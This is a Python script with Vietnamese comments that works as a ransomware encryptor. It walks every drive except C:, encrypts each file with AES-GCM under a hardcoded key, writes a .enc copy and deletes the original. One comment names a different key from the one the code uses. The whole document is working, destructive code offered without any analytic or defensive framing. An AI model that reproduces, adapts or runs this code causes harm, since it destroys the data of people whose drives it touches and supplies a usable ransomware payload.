import os, string
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import secrets

def main():
    # Khóa mã hóa: "thisisthesecrets" (16 bytes, phù hợp AES-128)
    key = b"lehoangphucthinh"
    
    # Tạo block cipher AES
    backend = default_backend()
    block = algorithms.AES(key)

    drives = [f"{d}:\\" for d in string.ascii_uppercase if os.path.exists(f"{d}:\\")]
    for drive in drives:
        if drive == "C:\\" : continue
        for root, dirs, files in os.walk(drive):
            for file_name in files:
                path = os.path.join(root, file_name)
                
                print(f"Encrypting {path}...")
                
                try:
                    # Đọc nội dung file gốc
                    with open(path, 'rb') as f:
                        original = f.read()
                    
                    # Tạo nonce ngẫu nhiên (12 bytes cho GCM)
                    nonce = secrets.token_bytes(12)
                    
                    # Tạo GCM mode
                    gcm = modes.GCM(nonce)
                    cipher = Cipher(block, gcm, backend=backend)
                    encryptor = cipher.encryptor()
                    
                    # Mã hóa dữ liệu
                    encrypted = encryptor.update(original) + encryptor.finalize()
                    tag = encryptor.tag
                    
                    # Kết hợp nonce + encrypted + tag
                    full_encrypted = nonce + encrypted + tag
                    
                    # Ghi vào file .enc
                    enc_path = path + ".enc"
                    with open(enc_path, 'wb') as f:
                        f.write(full_encrypted)
                    
                    # Xóa file gốc
                    os.remove(path)
                
                except Exception as e:
                    if "read" in str(e).lower():
                        print("error while reading file contents")
                    elif "write" in str(e).lower():
                        print("error while writing contents")
                    else:
                        print(f"Error: {e}")

if __name__ == "__main__":
    main()
